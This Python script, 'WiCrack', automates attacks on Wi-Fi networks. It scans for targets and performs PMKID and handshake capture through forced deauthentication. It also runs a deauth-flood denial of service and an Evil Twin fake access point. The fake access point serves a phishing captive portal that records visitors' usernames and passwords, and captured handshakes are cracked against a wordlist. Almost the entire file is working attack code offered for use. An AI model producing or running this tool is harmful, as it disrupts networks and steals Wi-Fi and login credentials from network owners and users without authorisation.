import os
import subprocess
import questionary
import threading
import time
import logging
from datetime import datetime
from shutil import which
from pyfiglet import figlet_format
import tkinter as tk
from tkinter import filedialog, messagebox

# ====== CONFIGURATION ======
WORK_DIR = "wicrack_output"
REQUIRED_TOOLS = [
    "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
    "hcxdumptool", "hcxpcapngtool", "mdk4"
]

# ====== LOGGING ======
logging.basicConfig(filename=os.path.join(WORK_DIR, 'wicrack.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ====== SETUP ======
os.makedirs(WORK_DIR, exist_ok=True)

# ====== UTILITIES ======
def show_banner():
    print("\033[94m" + figlet_format("WiCrack", font="slant") + "\033[0m")
    print("\033[92mAn Interactive Wi-Fi Attack Automation Script\033[0m")
    print("\033[90mBy: You :)\033[0m\n")


def check_requirements():
    missing = [tool for tool in REQUIRED_TOOLS if which(tool) is None]
    if missing:
        with open("requirements.txt", "w") as f:
            for tool in missing:
                f.write(f"{tool}\n")
        print("[!] Missing tools:", ", ".join(missing))
        print("[+] Saved in requirements.txt. Please install before continuing.")
        exit(1)


def enter_monitor_mode():
    iface = questionary.text("Enter wireless interface name (e.g., wlan0):").ask()
    subprocess.call(f"airmon-ng start {iface}", shell=True)
    return iface + "mon"


def scan_networks(iface):
    print("[~] Scanning networks. Press Ctrl+C when ready.")
    output_file = os.path.join(WORK_DIR, "scan_output")
    try:
        subprocess.call(f"airodump-ng {iface} -w {output_file} --output-format csv", shell=True)
    except KeyboardInterrupt:
        pass
    return output_file + "-01.csv"


def parse_csv(file):
    networks = []
    with open(file, "r", encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()
    for line in lines:
        if line.count(",") > 10 and "Station MAC" not in line:
            parts = [x.strip() for x in line.split(",")]
            if len(parts) >= 14:
                networks.append({"BSSID": parts[0], "Channel": parts[3], "ESSID": parts[-1]})
    return networks


def select_target(networks):
    choices = [f"{net['ESSID']} ({net['BSSID']})" for net in networks if net['ESSID']]
    if not choices:
        print("[!] No networks detected.")
        exit(1)
    selected = questionary.select("Select target network:", choices=choices).ask()
    for net in networks:
        if net['ESSID'] in selected:
            return net


def perform_pmkid_attack(iface, output_prefix):
    print("[~] Launching PMKID attack...")
    logging.info("Starting PMKID attack")
    subprocess.call(f"hcxdumptool -i {iface} -o {output_prefix}.pcapng --enable_status=1", shell=True)
    subprocess.call(f"hcxpcapngtool -o {output_prefix}.hccapx {output_prefix}.pcapng", shell=True)


def perform_handshake_attack(target, iface, output_prefix):
    print("[~] Capturing handshake using deauth attack...")
    logging.info("Starting handshake attack")
    airodump = f"airodump-ng --bssid {target['BSSID']} -c {target['Channel']} -w {output_prefix} {iface}"
    aireplay = f"aireplay-ng --deauth 10 -a {target['BSSID']} {iface}"
    try:
        airo = subprocess.Popen(airodump, shell=True)
        subprocess.call(aireplay, shell=True)
        input("[~] Press Enter when handshake is captured...")
        airo.terminate()
    except KeyboardInterrupt:
        airo.terminate()


def perform_dos_attack(target, iface):
    print("[~] Starting DoS (deauth flood) using mdk4...")
    logging.info("Starting DoS attack")
    subprocess.call(f"mdk4 {iface} d -B {target['BSSID']} -c {target['Channel']}", shell=True)


def perform_evil_twin_attack(target, iface):
    print("[~] Launching Evil Twin attack...")
    logging.info("Evil Twin attack started")

    # Start Fake AP using airbase-ng
    ap_thread = threading.Thread(
        target=lambda: subprocess.call(
            f"airbase-ng -e \"{target['ESSID']}_FreeWiFi\" -c {target['Channel']} {iface}",
            shell=True
        )
    )
    ap_thread.start()
    time.sleep(5)

    # Start deauth flood to disconnect clients
    subprocess.call(f"mdk4 {iface} d -B {target['BSSID']} -c {target['Channel']}", shell=True)

    # Start fake login portal
    print("[*] Starting fake captive portal on port 8080...")
    logging.info("Starting captive portal on localhost:8080")
    portal_thread = threading.Thread(target=start_fake_portal)
    portal_thread.start()



def crack_password(capture_file):
    wordlist = questionary.path("Select wordlist file:").ask()
    subprocess.call(f"aircrack-ng {capture_file} -w {wordlist}", shell=True)


def generate_report(target):
    report_name = os.path.join(WORK_DIR, f"wicrack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md")
    with open(report_name, "w") as f:
        f.write(f"# WiCrack Report\n\n")
        f.write(f"## Target: {target['ESSID']} ({target['BSSID']})\n")
        f.write(f"- Channel: {target['Channel']}\n")
        f.write(f"- Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    print(f"[+] Report generated: {report_name}")

# GUI Placeholder (optional expansion)
def gui_launcher():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("WiCrack", "GUI mode is under construction.")

def start_fake_portal():
    import http.server
    import socketserver

    class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = """
            <html><head><title>Login</title></head>
            <body><h2>Wi-Fi Login</h2>
            <form method='POST'>
            Username: <input name='user'><br>
            Password: <input type='password' name='pass'><br>
            <input type='submit'>
            </form></body></html>
            """
            self.wfile.write(html.encode())

        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            logging.info("[CAPTIVE] Credentials received: " + post_data)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Login successful. Internet access granted.")

    try:
        os.chdir(WORK_DIR)
        with socketserver.TCPServer(("0.0.0.0", 8080), CaptivePortalHandler) as httpd:
            httpd.serve_forever()
    except Exception as e:
        logging.error("Failed to start captive portal: " + str(e))


# ===== MAIN FLOW =====
def main():
    clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')
    clear()
    show_banner()
    check_requirements()
    iface = enter_monitor_mode()
    csv_path = scan_networks(iface)
    networks = parse_csv(csv_path)
    target = select_target(networks)

    output_prefix = os.path.join(WORK_DIR, target['ESSID'].replace(' ', '_'))

    attacks = questionary.checkbox(
        "Choose attacks to perform:",
        choices=["PMKID", "Handshake", "Deauth Flood (DoS)", "Evil Twin"]
    ).ask()

    threads = []
    if "PMKID" in attacks:
        threads.append(threading.Thread(target=perform_pmkid_attack, args=(iface, output_prefix)))
    if "Handshake" in attacks:
        threads.append(threading.Thread(target=perform_handshake_attack, args=(target, iface, output_prefix)))
    if "Deauth Flood (DoS)" in attacks:
        threads.append(threading.Thread(target=perform_dos_attack, args=(target, iface)))
    if "Evil Twin" in attacks:
        threads.append(threading.Thread(target=perform_evil_twin_attack, args=(target, iface)))

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    cap_files = [f for f in os.listdir(WORK_DIR) if f.endswith((".cap", ".pcapng", ".hccapx"))]
    if cap_files:
        crack = questionary.confirm("Do you want to try cracking the captured handshake?").ask()
        if crack:
            capture_file = questionary.select("Select file to crack:", choices=cap_files).ask()
            crack_password(os.path.join(WORK_DIR, capture_file))

    generate_report(target)
    print("\n[✔] WiCrack operation complete.")

if __name__ == "__main__":
    main()
